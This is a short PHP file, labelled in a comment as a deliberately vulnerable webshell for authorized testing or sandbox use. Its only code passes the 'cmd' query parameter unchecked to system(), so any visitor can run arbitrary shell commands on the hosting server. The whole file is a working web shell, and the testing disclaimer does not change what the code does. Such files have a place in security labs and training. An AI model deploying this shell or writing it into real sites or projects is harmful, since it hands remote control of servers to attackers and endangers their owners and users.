<?php
// Deliberately vulnerable webshell — FOR AUTHORIZED TESTING/SANDBOX ONLY
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
